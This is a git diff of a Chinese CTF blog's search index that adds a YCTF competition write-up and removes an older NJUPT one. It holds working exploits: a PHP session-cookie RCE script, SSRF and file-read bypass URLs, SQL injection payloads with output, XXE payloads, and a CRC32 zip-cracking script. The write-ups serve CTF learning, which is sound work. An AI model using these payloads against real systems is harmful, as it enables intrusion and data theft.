@@ -194,6 +194,7 @@
 <p>解开是 <code>CCGandGulu</code> 是压缩包的密码</p>
 <p>利用silenteye解密</p>
 <p><img src="/2020/03/2020北邮校赛/image-20200413200509558.png" alt="image-20200413200509558"></p>
+<p><a href="https://www.ctfwp.com/%E5%AE%98%E6%96%B9%E8%B5%9B%E4%BA%8B%E9%A2%98/2020MRCTF" target="_blank" rel="noopener">参考文章</a></p>
 ]]></content>
       <categories>
         <category>CTF</category>
@@ -206,22 +207,73 @@
   <entry>
     <title>51ELAB易霖博YCTF</title>
     <url>/2020/03/51ELAB%E6%98%93%E9%9C%96%E5%8D%9AYCTF-WP/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
-  <div class="hbe-input-container">
-  <input type="password" id="hbePass" placeholder="" />
-    <label for="hbePass">Hey, password is required here.</label>
-    <div class="bottom-line"></div>
-  </div>
-  <script id="hbeData" type="hbeData" data-hmacdigest="3934c513ecbb2623b88902986369fef131ea022bafa76fe01ccc1749f59d5fb2">94a100f5d0b5181212cd7852ebe43024</script>
-</div>
-<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="1-RCE"><a href="#1-RCE" class="headerlink" title="1.RCE"></a>1.RCE</h3><p>源码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'var'</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">';'</span> === preg_replace(<span class="string">'/[^\W]+\((?R)?\)/'</span>, <span class="string">''</span>, $_GET[<span class="string">'var'</span>])) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!preg_match(<span class="string">'/et|dir|na|info|dec|oct|pi|log/i'</span>, $_GET[<span class="string">'var'</span>])) &#123;</span><br><span class="line">                    <span class="keyword">eval</span>($_GET[<span class="string">'var'</span>]);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"Sorry!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><a id="more"></a>
+
+
+<p>无参数RCE</p>
+<p>session_id() 可以用来获取/设置当前会话 ID。那么我们可以用此方法来获取phpsessionid，并且phpsessionid可控</p>
+<p>eval(hex2bin(session_id(session_start())));即可执行任意命令</p>
+<p>推荐看看这篇<a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/" target="_blank" rel="noopener">文章</a>姿势很全</p>
+<p>payload</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str2hex</span><span class="params">(strs)</span>:</span></span><br><span class="line">    ret=<span class="string">''</span></span><br><span class="line">    b = list(strs)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> b:</span><br><span class="line">        c = hex(ord(i)).replace(<span class="string">"0x"</span>,<span class="string">""</span>)</span><br><span class="line">        ret +=c</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"><span class="string">"""def str2hex(strs):</span></span><br><span class="line"><span class="string">	bstrs=bytes(strs,'utf-8')</span></span><br><span class="line"><span class="string">	ret = ''.join(['%02x' %b for b in bstrs])</span></span><br><span class="line"><span class="string">	return ret</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">url= <span class="string">"http://124.193.74.212:36060/?var=eval(hex2bin(session_id(session_start())));"</span></span><br><span class="line">payload=<span class="string">"var_dump(file_get_contents('/flag.txt'));"</span></span><br><span class="line">payload=str2hex(payload)</span><br><span class="line">cookies=&#123;<span class="string">'PHPSESSID'</span>:payload&#125;</span><br><span class="line">res =requests.get(url,cookies=cookies)</span><br><span class="line">print(res.content)</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-SSRF"><a href="#2-SSRF" class="headerlink" title="2.SSRF"></a>2.SSRF</h3><p>访问直接跳转到：</p>
+<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="symbol">http:</span><span class="comment">//124.193.74.211:13187/index.php?file=WTNSbWFXMWhaMlV1YW5Cbg==</span></span><br></pre></td></tr></table></figure>
+
+<p>url一看怀疑是任意文件读取</p>
+<p>然后把 <code>index.php</code> 两次base64编码 <code>YVc1a1pYZ3VjR2h3</code></p>
+<p>index.php</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(E_ALL || ~E_NOTICE);</span><br><span class="line"></span><br><span class="line">header(<span class="string">'content-type:text/html;charset=utf-8'</span>);</span><br><span class="line"><span class="keyword">if</span>(! <span class="keyword">isset</span>($_GET[<span class="string">'file'</span>]))</span><br><span class="line">    header(<span class="string">'Refresh:0;url=./index.php?file=WTNSbWFXMWhaMlV1YW5Cbg=='</span>);</span><br><span class="line">$file = base64_decode(base64_decode($_GET[<span class="string">'file'</span>]));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;title&gt;'</span>.$_GET[<span class="string">'file'</span>].<span class="string">'&lt;/title&gt;'</span>;</span><br><span class="line">$file = preg_replace(<span class="string">"/[^a-zA-Z0-9.]+/"</span>,<span class="string">""</span>, $file);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'input_filename:   '</span>. $file.<span class="string">'&lt;/br&gt;'</span>;</span><br><span class="line">$file = str_replace(<span class="string">"ctf"</span>,<span class="string">"flag"</span>, $file);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'real_filename:   '</span>.$file.<span class="string">'&lt;/br&gt;'</span>;</span><br><span class="line">$txt = base64_encode(file_get_contents($file));</span><br><span class="line"> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;img src='data:image/gif;base64,"</span>.$txt.<span class="string">"'&gt;&lt;/img&gt;"</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Can you find the flag file?</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Hint: hal0flagi5here.php</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>
+
+<p>发现源码中有提示 <code>hal0flagi5here.php</code></p>
+<p>根据提示查看</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$argv[<span class="number">1</span>]=$_GET[<span class="string">'url'</span>];</span><br><span class="line"><span class="keyword">if</span>(filter_var($argv[<span class="number">1</span>],FILTER_VALIDATE_URL))</span><br><span class="line">&#123;</span><br><span class="line">true$r = parse_url($argv[<span class="number">1</span>]);</span><br><span class="line">trueprint_r($r);</span><br><span class="line">true<span class="keyword">if</span>(preg_match(<span class="string">'/happyctf\.com$/'</span>,$r[<span class="string">'host'</span>]))</span><br><span class="line">true&#123;</span><br><span class="line">truetrue$url=file_get_contents($argv[<span class="number">1</span>]);</span><br><span class="line">truetrue<span class="keyword">echo</span>($url);</span><br><span class="line">true&#125;<span class="keyword">else</span></span><br><span class="line">true&#123;</span><br><span class="line">truetrue<span class="keyword">echo</span>(<span class="string">"error"</span>);</span><br><span class="line">true&#125;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">true<span class="keyword">echo</span> <span class="string">"403 Forbidden"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>主要是绕过<code>filter_var()</code>和<code>parse_url()</code>以及<code>file_get_contents()</code></p>
+<p>payload</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">hal0flagi5here.php?url=dict:<span class="regexp">//</span>happyctf.com<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/flag.txt</span></span><br></pre></td></tr></table></figure>
+
+<p>或者</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">hal0flagi5here.php?url=test:<span class="comment">//happyctf.com/../../../../../../flag.txt</span></span><br></pre></td></tr></table></figure>
+
+<p>这个test只要为一个php不认识的protocol时，php会抛一个warning，并将protocol设置为空，在protocol为null或者file时，则进行本地文件操作。</p>
+<h3 id="3-SQLI"><a href="#3-SQLI" class="headerlink" title="3.SQLI"></a>3.SQLI</h3><p>RCTF2015的原题</p>
+<p>正常套路，先fuzz下</p>
+<p>以下是被过滤的字符</p>
+<p><img src="/2020/03/51ELAB易霖博YCTF-WP/image-20200415185646715.png" alt="image-20200415185646715"></p>
+<p>注册一个正常的用户，登录后发现可以修改密码，怀疑是二次注入</p>
+<p>就有注册 <code>sss&quot;1</code>的用户，登陆后进入修改密码的页面，发现报错了</p>
+<p><img src="/2020/03/51ELAB易霖博YCTF-WP/image-20200415204058693.png" alt="image-20200415204058693"></p>
+<p>接着构造payload</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">爆表</span><br><span class="line">sss&quot;||updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),0x7e),1)#</span><br><span class="line">XPATH syntax error: &apos;~article,flag,users~&apos;</span><br><span class="line"></span><br><span class="line">column</span><br><span class="line">sss&quot;||updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_schema=database())),0x7e),1)#</span><br><span class="line">XPATH syntax error: &apos;~title,content,flag,name,pwd,ema&apos;</span><br><span class="line"></span><br><span class="line">flag</span><br><span class="line">sss&quot;||updatexml(1,concat(0x7e,(select(flag)from(flag)),0x7e),1)#</span><br><span class="line">XPATH syntax error: &apos;~flag&#123;19de358061&#125;~&apos;</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-XXE"><a href="#4-XXE" class="headerlink" title="4.XXE"></a>4.XXE</h3><p>upload.php</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">"submit"</span>])) &#123;</span><br><span class="line">    $target_file = getcwd().<span class="string">"/upload/"</span>.md5($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>]);</span><br><span class="line">    <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>], $target_file)) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            $result = @file_get_contents(<span class="string">"zip://"</span>.$target_file.<span class="string">"#docProps/core.xml"</span>);</span><br><span class="line">            $xml = <span class="keyword">new</span> SimpleXMLElement($result, LIBXML_NOENT);</span><br><span class="line">            $xml-&gt;registerXPathNamespace(<span class="string">"dc"</span>, <span class="string">"http://purl.org/dc/elements/1.1/"</span>);</span><br><span class="line">            <span class="keyword">foreach</span>($xml-&gt;xpath(<span class="string">'//dc:title'</span>) <span class="keyword">as</span> $title)&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"Title '"</span>.$title . <span class="string">"' has been added.&lt;br/&gt;"</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (<span class="keyword">Exception</span> $e)&#123;</span><br><span class="line">            <span class="keyword">echo</span> $e;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"上传文件不是一个docx文档."</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"上传失败."</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>关键代码：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$result = @file_get_contents(<span class="string">"zip://"</span>.$target_file.<span class="string">"#docProps/core.xml"</span>);</span><br></pre></td></tr></table></figure>
+
+<p>输出了tilte：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">foreach</span>($xml-&gt;xpath(<span class="string">'//dc:title'</span>) <span class="keyword">as</span> $title)&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"Title '"</span>.$title . <span class="string">"' has been added.&lt;br/&gt;"</span>;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>
+
+<p>payload:修改docProps/core.xml内容</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8" standalone="yes"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE root[</span></span><br><span class="line"><span class="meta">&lt;!ENTITY xxe SYSTEM "/flag.txt"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">cp:coreProperties</span> <span class="attr">xmlns:cp</span>=<span class="string">"http://schemas.openxmlformats.org/package/2006/metadata/core-properties"</span> <span class="attr">xmlns:dc</span>=<span class="string">"http://purl.org/dc/elements/1.1/"</span> <span class="attr">xmlns:dcterms</span>=<span class="string">"http://purl.org/dc/terms/"</span> <span class="attr">xmlns:dcmitype</span>=<span class="string">"http://purl.org/dc/dcmitype/"</span> <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span>&gt;</span></span><br><span class="line">dc:title&amp;xxe;<span class="tag">&lt;/<span class="name">dc:title</span>&gt;</span></span><br><span class="line">dc:subject<span class="tag">&lt;/<span class="name">dc:subject</span>&gt;</span></span><br><span class="line">dc:creator<span class="tag">&lt;/<span class="name">dc:creator</span>&gt;</span></span><br><span class="line">cp:keywords<span class="tag">&lt;/<span class="name">cp:keywords</span>&gt;</span></span><br><span class="line">dc:description<span class="tag">&lt;/<span class="name">dc:description</span>&gt;</span></span><br><span class="line">cp:lastModifiedBy<span class="tag">&lt;/<span class="name">cp:lastModifiedBy</span>&gt;</span></span><br><span class="line">cp:revision1<span class="tag">&lt;/<span class="name">cp:revision</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dcterms:created</span> <span class="attr">xsi:type</span>=<span class="string">"dcterms:W3CDTF"</span>&gt;</span>2015-08-01T19:00:00Z<span class="tag">&lt;/<span class="name">dcterms:created</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dcterms:modified</span> <span class="attr">xsi:type</span>=<span class="string">"dcterms:W3CDTF"</span>&gt;</span>2015-08-01T19:01:00Z<span class="tag">&lt;/<span class="name">dcterms:modified</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">cp:coreProperties</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>保存，上传即可</p>
+<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="1-CRC32"><a href="#1-CRC32" class="headerlink" title="1.CRC32"></a>1.CRC32</h3><p>压缩包中有三个文件存放了解压密码</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="keyword">global</span> flag</span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CrackCrc</span><span class="params">(crc, I)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> dic:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">            <span class="keyword">for</span> p <span class="keyword">in</span> dic:</span><br><span class="line">                <span class="keyword">for</span> q <span class="keyword">in</span> dic:</span><br><span class="line">                    s = i + j + p + q</span><br><span class="line">                    <span class="keyword">if</span> crc == (binascii.crc32(s.encode())):</span><br><span class="line">                        print(str(I) + <span class="string">":"</span> + s)</span><br><span class="line">                        <span class="keyword">global</span> flag</span><br><span class="line">                        flag = flag + s</span><br><span class="line">                        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CrackZip</span><span class="params">()</span>:</span></span><br><span class="line">    f = zipfile.ZipFile(<span class="string">"CRC32.zip"</span>, <span class="string">'r'</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">4</span>):</span><br><span class="line">        GetCrc = f.getinfo(<span class="string">'pass'</span>+str(i)+<span class="string">'.txt'</span>)</span><br><span class="line">        crc = GetCrc.CRC</span><br><span class="line">        print(crc)</span><br><span class="line">        CrackCrc(crc, i)</span><br><span class="line">dic = string.printable</span><br><span class="line">CrackZip()</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
+
+<p>   <img src="/2020/03/51ELAB易霖博YCTF-WP/image-20200415215316552.png" alt="image-20200415215316552">                            </p>
+<p>解压得到flag</p>
+<h3 id="2-easyrsa"><a href="#2-easyrsa" class="headerlink" title="2.easyrsa"></a>2.easyrsa</h3><p>给了私钥和密文</p>
+<p><img src="/2020/03/51ELAB易霖博YCTF-WP/image-20200415215428837.png" alt="image-20200415215428837"></p>
+]]></content>
       <categories>
         <category>CTF</category>
       </categories>
       <tags>
-        <tag>tag1</tag>
-        <tag>tag2</tag>
-        <tag>tag3</tag>
+        <tag>WEB</tag>
+        <tag>CTF</tag>
       </tags>
   </entry>
   <entry>
@@ -343,32 +395,6 @@
       </categories>
       <tags>
         <tag>base64</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>2019NJUPT_CTF_WP</title>
-    <url>/2019/11/2019NJUPT-WP/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="Fake-XML-cookbook"><a href="#Fake-XML-cookbook" class="headerlink" title="Fake XML cookbook"></a>Fake XML cookbook</h2><p>简单的XML</p><p><img src="/2019/11/2019NJUPT-WP/image-20191122221701015.png" alt="image-20191122221701015"></p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE ANY [</span></span><br><span class="line"><span class="meta">&lt;!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=../../../flag" &gt;]&gt;</span>     </span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>1<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure><a id="more"></a>
-
-
-
-<h3 id="True-XML-cookbook"><a href="#True-XML-cookbook" class="headerlink" title="True XML cookbook"></a>True XML cookbook</h3><p>接着用上面的payload</p>
-<p><img src="/2019/11/2019NJUPT-WP/image-20191122222006279.png" alt="image-20191122222006279"></p>
-<p>正如提示所说，要利用xml做更多的事情</p>
-<h3 id="Upload-your-Shell"><a href="#Upload-your-Shell" class="headerlink" title="Upload your Shell"></a>Upload your Shell</h3><p>题目有一些过滤 后缀必须是图片的后缀</p>
-<p>文件中不能出现 <code>?&gt;</code></p>
-<p>上传后php代码成功就直接给flag的位置</p>
-<p><img src="/2019/11/2019NJUPT-WP/image-20191122225502634.png" alt="image-20191122225502634"></p>
-<p>想到页面中有个action参数</p>
-<p>把flag的位置给action得到flag</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://nctf2019.x1ct34m.com:60002/index.php?action=/var/www/html/upload-imgs/e8849c5939285e7053ba8d7af6cb1c25/Th1s_is_a_fl4g.jpg</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>WP</tag>
       </tags>
   </entry>
   <entry>
@@ -1065,8 +1091,8 @@ Content-Type: multipart/from-data;boundary=xxx
         <category>CTF</category>
       </categories>
       <tags>
-        <tag>WP</tag>
         <tag>PHP</tag>
+        <tag>WP</tag>
       </tags>
   </entry>
 </search>
